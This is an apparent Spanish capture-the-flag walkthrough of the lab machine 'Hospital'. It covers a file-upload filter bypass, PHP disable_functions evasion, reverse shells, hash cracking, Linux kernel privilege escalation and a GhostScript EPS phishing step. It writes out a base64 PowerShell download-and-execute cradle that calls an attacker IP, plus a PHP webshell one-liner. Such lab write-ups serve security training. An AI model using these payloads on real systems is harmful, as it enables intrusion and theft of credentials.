---
sticker: emoji//1f3e5
tags:
  - base64
  - hashcat
  - hashid
  - Linux
  - misconfiguration
  - nc
  - nmap
---
# Reconocimiento

Comencé el proceso utilizando Nmap para el escaneo.

![](ss/Hospital/nmap.png)
![](ss/Hospital/nmap2.png)

## Puerto 443 ( HTTPS )

La máquina tiene un servicio HTTPS en el puerto 443, que es una página web con el cliente Roundcube para la gestión de correos electrónicos. En el backend, está ejecutando un servidor Windows.

![](ss/Hospital/https.png)

## Puerto 8080 ( HTTP )

En el puerto 8080, hay un sitio web perteneciente al hospital que, en el backend, utiliza PHP.

![](ss/Hospital/http.png)

# Enumeración

Al intentar ingresar con el usuario 'admin', se muestra un mensaje que dice 'The username is already taken', lo que indica que el usuario admin ya existe.

Procedí a crear una cuenta con el usuario y contraseña 'admin2':'admin123'.

![](ss/Hospital/user_admin_exists.png)

Al ingresar, parece ser solo un sitio web para que los pacientes suban sus registros médicos.

![](ss/Hospital/index_http.png)

El tipo de archivo esperado es una imagen.

![](ss/Hospital/type_of_file.png)

A continuación, intercepté la petición con [[Burp Suite]] y probé con otras extensiones, como archivos .php, ya que sabemos que está ejecutando PHP en el backend. También probé extensiones como .php5, .phtm, .phar, etc.

![](ss/Hospital/burp_http_upload.png)

Resoponde con un "Failed" al user la extension .php.

![](ss/Hospital/failed.png)

Success con la extension .phtm.

![](ss/Hospital/success.png)

Noté un archivo upload.php, lo que sugiere que hay una ruta donde se guardan las imágenes, probablemente en la carpeta de 'uploads'.

![](ss/Hospital/uploads.png)
## Fuzzing de extensiones de archivos con ffuf

Copié la solicitud de Burp Suite y la utilicé para realizar fuzzing con herramientas como ffuf, wfuzz, etc.

![](ss/Hospital/upload_req.png)

```
ffuf -request upload.req -request-proto http -w /opt/Seclists/Fuzzing/extensions-most-common.fuzz.txt
```

![](ss/Hospital/ffuf_1.png)

Para filtrar las extensiones que realmente están funcionando, utilicé '-mr' para aplicar una expresión regular que filtre las respuestas que contienen 'success' en su body.

```
ffuf -request upload.req -request-proto http -w /opt/Seclists/Fuzzing/extensions-most-common.fuzz.txt -mr success
```

Hubo varios coincidencias, pero no utilicé ninguna de esas extensiones. Probé la extensión 'phar' manualmente y funcionó.

![](ss/Hospital/ffuf_success.png)

Luego, utilicé phpinfo() para ver las disable_functions.

![](ss/Hospital/phpinfo.png)
![](ss/Hospital/disable_functions.png)

## Bypassing the disable_functions

https://github.com/teambi0s/dfunc-bypasser

Lo que voy hacer es crear un foreach en php que me muestre si una funcion peligrosa existe.

![](ss/Hospital/script_disable_functions.png)

Encontré seis funciones peligrosas que podría usar para ejecutar comandos en el sistema. Probé con la función 'popen'.

![](ss/Hospital/danger_functions.png)

Para eso, consulté la documentación.

![](ss/Hospital/popen_example.png)
![](ss/Hospital/popen_1.png)
## RCE ( HTTP 8080 )

Ya estamos ejecutando comandos en el sistema.

![](ss/Hospital/RCE_8080.png)

Ahora que estaba ejecutando comandos en el sistema, creé una reverse shell con bash y me puse en escucha con [[nc]].

![](ss/Hospital/rev_shell_bash.png)
![](ss/Hospital/nc_1.png)

Las credenciales de la base de datos estaban expuestas en el config.php.

![](ss/Hospital/pass_db.png)

```
mysql -u root -p
```

![](ss/Hospital/mysql.png)

Teníamos hashes que podíamos intentar romper.

![](ss/Hospital/users_table.png)

Utilicé hashid para identificar el tipo de hash.

![](ss/Hospital/hashid.png)

```
hashcat -a 0 -m 3200 hashes.8080 /usr/share/wordlists/rockyou.txt
```

Credenciales encontradas:
```
admin:123456
patient:patient
```

![](ss/Hospital/hash_cracked.png)

Sin embargo, ninguna funcionó. Verifiqué la versión del kernel y encontré varios CVE's.

![](ss/Hospital/kernel_vulnerable.png)
## Escalada de privilegios en servidor linux con el CVE más reciente - 2024-1086

![](ss/Hospital/cve-24.png)

## Escalada de privilegios en servidor linux CVE-2023-2640-CVE-2023-32629

GameOver(lay) Ubuntu Privilege Escalation.

![](ss/Hospital/cve-2023.png)
![](ss/Hospital/root-linux.png)
![](ss/Hospital/shadow.png)

Intenté romper los hashes del archivo shadow.

![](ss/Hospital/hashid2.png)
![](ss/Hospital/hash_cracked2.png)
## Escalada de privilegios en servidor linux CVE-2023-35001

nftables oob read/write exploit (CVE-2023-35001)

![](ss/Hospital/cve-2023-35001.png)
![](ss/Hospital/cve-2023-2.png)

# Post-Explotación

## Roundcube ( webmail )

Accedí como 'drwilliams'. Tenía un correo pendiente de responder de 'drbrown', quien aparentemente estaba esperando que 'drwilliams' le enviara un diseño en formato ".eps" para visualizarlo con GhostScript.

![](ss/Hospital/mail.png)

Al investigar un poco sobre GhostScript, encontré un CVE que permitía la inyección de comandos.

![](ss/Hospital/cve-ghost.png)

Paso 1

Codifiqué en base64 un comando en PowerShell para descargar un archivo de la web.

```
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.6/shell.ps1")' | iconv -t UTF-16le | base64 -w 0
```

![](ss/Hospital/paso_1.png)

Paso 2

Generé el archivo ".eps" e inyecté el comando malicioso de PowerShell en base64.

![](ss/Hospital/paso_2.png)

Paso 3

Levanté un servidor en el puerto 80 con Python3 en la ruta donde se encontraba el shell.ps1. Esto permitiría que, una vez que la víctima ejecutara el ".eps", el comando de PowerShell en base64 se ejecutara y descargara y ejecutara el shell.ps1, que era una reverse shell.

Luego, me puse en escucha en el puerto 443 con nc, donde recibiríamos la reverse shell.

![](ss/Hospital/paso_3.png)

Paso 4

Le envié el archivo ".eps" por correo a 'drbrown'. Si estaba esperando el archivo ".eps", al abrirlo deberíamos obtener la conexión.

![](ss/Hospital/paso_4.png)

Efectivamente, pudimos observar que recibimos una petición en nuestro servidor con Python3 y obtuvimos una reverse shell con nc.

![](ss/Hospital/connected.png)

Estaba utilizando XAMPP, así que creé una webshell.php en htdocs y elevé los privilegios en la maquina principal que es la 10.10.11.241 Windows.

![](ss/Hospital/xampp_1.png)

Una forma de hacerlo fue:

```
echo '<?php system($_REQUEST["cmd"]); ?>' | Out-File -Encoding UTF8 shell.php
```

![](ss/Hospital/cmd_request_3.png)
![](ss/Hospital/cmd_request_burpsuite.png)

Para la siguiente forma, utilicé este repositorio: [https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)

![](ss/Hospital/nt_autho.png)

# PWN3D.2